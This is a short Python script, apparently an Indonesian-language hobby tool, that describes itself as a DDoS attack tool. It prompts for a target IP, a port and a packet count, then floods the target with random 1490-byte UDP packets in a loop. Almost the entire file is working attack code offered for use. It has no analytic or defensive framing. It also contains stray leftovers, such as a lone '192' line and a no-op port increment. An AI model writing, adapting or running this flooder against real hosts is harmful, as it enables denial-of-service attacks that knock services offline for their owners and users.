from colorama import Fore, Back, Style
import socket

def tampilkan_ascii_art():
    custom_art = """
   _____  _  ____  ____  ____  ____    ____ ___  _
  /__ __\/ \/  _ \/  _ \/  _ \/ ___\  /  __\\  \//
    / \  | || | \|| | \|| / \||    \  |  \/| \  / 
    | |  | || |_/|| |_/|| \_/|\___ |__|  __/ / /  
    \_/  \_/\____/\____/\____/\____/\/\_/   /_/                                                                                                           
    """
    print(Fore.GREEN + custom_art + Style.RESET_ALL)
tampilkan_ascii_art()



import os
import time
import socket
import random
from datetime import datetime

# Code Time
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
192

print(Fore.RED + "Welcome To DDOS Attack Tool that i get from github") 

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)  # Menghasilkan data acak
#############

# Input target IP and port

ip = input(Fore.LIGHTMAGENTA_EX + "Input IP Target To Attack : ")
port = int(input(Fore.BLUE + "Port       : "))

# Clear screen again and show progress
os.system("cls" if os.name == "nt" else "clear")
print("[Memulai Attacking]")
print(Fore.LIGHTMAGENTA_EX + "[==                               ] 0% ")
time.sleep(1)
print(Fore.LIGHTMAGENTA_EX + "[======                           ] 25%")
time.sleep(1)
print(Fore.LIGHTMAGENTA_EX + "[==============                   ] 50%")
time.sleep(1)
print(Fore.LIGHTMAGENTA_EX + "[=====================            ] 75%")
time.sleep(1)
print(Fore.LIGHTMAGENTA_EX + "[=================================] 100%")
time.sleep(1)

sent = 0
max_flood = int(input(Fore.RED + "Masukan Berapa Flood yang diinginkan : "))
while sent < max_flood:
    try:
        sock.sendto(bytes, (ip, port))
        sent += 1
        port += 0
        print(Fore.WHITE + f"  Menyerang {sent} Flood ke {ip} melewati port : {port}  " + Style.BRIGHT )
        
        if port > 65535:
            port = 1
        time.sleep(0.02)
    except KeyboardInterrupt:
        print("\n Attacking di Hentikan!")
        break
print(Fore.GREEN + f"Penyerangan Berhasil sebanyak {sent} ")
